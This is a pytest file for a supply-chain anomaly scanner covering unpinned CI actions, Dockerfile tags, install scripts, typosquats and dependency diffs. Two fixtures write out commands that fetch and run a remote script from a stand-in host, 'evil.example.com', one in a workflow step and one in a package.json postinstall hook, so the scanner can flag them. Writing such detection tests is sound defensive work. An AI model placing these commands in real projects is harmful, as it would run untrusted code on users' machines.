import json

from trustchain.anomaly import scan_anomalies
from trustchain.anomaly.ci import scan_workflows
from trustchain.anomaly.diff import diff_inventories, _version_direction
from trustchain.anomaly.docker import scan_dockerfiles
from trustchain.anomaly.scripts import scan_install_scripts
from trustchain.anomaly.typosquat import scan_typosquats


def _write(path, content):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def test_unpinned_ci_action(tmp_path):
    wf = tmp_path / ".github" / "workflows" / "ci.yml"
    _write(wf, """name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@1bf44e3a9d4d5f5a6e7f8a9b0c1d2e3f4a5b6c7d
      - uses: ./local-action
      - run: echo hello
""")
    findings = scan_workflows(str(tmp_path))
    unpinned = [f for f in findings if f["anomaly"] == "unpinned-ci-action"]
    assert len(unpinned) == 1  # checkout@v4; SHA and local path are pinned
    assert unpinned[0]["component"] == "actions/checkout"
    assert unpinned[0]["evidence"]["line"] == 7
    assert unpinned[0]["verified"] is True


def test_risky_run_steps(tmp_path):
    wf = tmp_path / ".github" / "workflows" / "bad.yml"
    _write(wf, """name: bad
on: [push]
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://evil.example.com/install.sh | bash
""")
    findings = scan_workflows(str(tmp_path))
    labels = {f["anomaly"] for f in findings}
    assert "curl-piped-to-shell" in labels


def test_dockerfile_latest_flag(tmp_path):
    _write(tmp_path / "Dockerfile", """FROM node:latest
COPY . .
""")
    _write(tmp_path / "Dockerfile.pinned", """FROM node:20.11.1@sha256:abc123
COPY . .
""")
    _write(tmp_path / "Dockerfile.tagged", """FROM node:20.11.1-alpine
COPY . .
""")
    findings = scan_dockerfiles(str(tmp_path))
    flagged = [f["component"] for f in findings]
    assert "node:latest" in flagged
    assert "node:20.11.1@sha256:abc123" not in flagged
    assert "node:20.11.1-alpine" not in flagged


def test_unsafe_install_script(tmp_path):
    _write(tmp_path / "package.json", json.dumps({
        "name": "evil-pkg", "version": "1.0.0",
        "scripts": {"postinstall": "curl https://evil.example.com/x.sh | bash"},
    }))
    findings = scan_install_scripts(str(tmp_path))
    labels = {f["anomaly"] for f in findings}
    assert "unsafe-install-script:curl-piped-to-shell" in labels
    assert all(f["severity"] == "HIGH" for f in findings)
    assert all(f["verified"] is True for f in findings)


def test_typosquat_detection():
    inventory = {"components": [
        {"key": "npm:colors@1.4.0", "ecosystem": "npm", "name": "colors", "version": "1.4.0", "required_by": []},
        {"key": "npm:colros@1.0.0", "ecosystem": "npm", "name": "colros", "version": "1.0.0", "required_by": []},
        {"key": "npm:lodash@4.17.21", "ecosystem": "npm", "name": "lodash", "version": "4.17.21", "required_by": []},
        {"key": "npm:react-router@6.0.0", "ecosystem": "npm", "name": "react-router", "version": "6.0.0", "required_by": []},
    ]}
    findings = scan_typosquats(inventory)
    names = {f["component_name"] for f in findings}
    assert "colros" in names  # near-duplicate of "colors"
    assert "colors" not in names
    assert "lodash" not in names
    assert all(f["verified"] is False for f in findings)  # similarity fact, intent is inference


def test_diff_inventories():
    before = {"target": "commitA", "components": [
        {"key": "npm:a@1.0.0", "ecosystem": "npm", "name": "a", "version": "1.0.0"},
        {"key": "npm:b@2.0.0", "ecosystem": "npm", "name": "b", "version": "2.0.0"},
        {"key": "npm:c@1.0.0", "ecosystem": "npm", "name": "c", "version": "1.0.0"},
    ]}
    after = {"target": "commitB", "components": [
        {"key": "npm:a@1.0.0", "ecosystem": "npm", "name": "a", "version": "1.0.0"},
        {"key": "npm:b@2.1.0", "ecosystem": "npm", "name": "b", "version": "2.1.0"},
        {"key": "npm:d@1.0.0", "ecosystem": "npm", "name": "d", "version": "1.0.0"},
    ]}
    findings = diff_inventories(before, after)
    changes = {(f["anomaly"], f["component_name"]) for f in findings}
    assert ("dependency-added", "d") in changes
    assert ("dependency-removed", "c") in changes
    assert ("dependency-version-changed", "b") in changes
    version_change = next(f for f in findings if f["anomaly"] == "dependency-version-changed")
    assert version_change["evidence"]["previous_version"] == "2.0.0"


def test_version_direction():
    assert _version_direction("1.2.3", "1.3.0") == "upgrade"
    assert _version_direction("2.0.0", "1.9.9") == "downgrade"
